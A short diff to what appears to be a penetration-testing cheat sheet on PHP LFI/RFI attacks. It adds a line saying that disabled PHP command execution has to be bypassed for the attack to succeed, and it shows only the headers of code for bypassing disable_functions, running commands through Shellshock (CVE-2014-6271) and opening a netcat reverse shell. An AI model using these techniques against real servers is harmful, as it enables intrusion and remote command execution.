@@ -73,6 +73,7 @@ allow_url_fopen = Off
 allow_url_include = Off
 ```
 ## 3. Bypass PHP disable_functions
+The server admin can disable PHP command execution to enhance the security. In that case, we have to bypass it so that our LFI/RFI attack is meaningful.
 ### Use PHP code to download file and list directory
 ```php
 function listDir($dir) {
@@ -135,7 +136,7 @@ function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
 }
 ?>
 ```
-### 4. Deal with missing -e option in netcat
+## 4. Deal with missing -e option in netcat
 ```php
 <?php
 function reverse_shell() {
